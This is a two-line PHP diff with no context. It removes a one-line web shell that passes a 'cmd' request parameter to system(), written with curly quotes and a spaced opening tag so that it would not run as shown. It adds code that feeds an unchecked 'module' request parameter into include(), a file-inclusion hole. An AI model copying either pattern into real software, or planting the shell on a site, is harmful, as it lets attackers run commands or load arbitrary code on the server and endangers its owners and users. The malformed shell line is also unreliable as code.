@@ -1,1 +1,2 @@
-< ?php system($_GET[‘cmd’]); ?>
+$dir = $_GET['module'];
+include($dir . "/function.php");
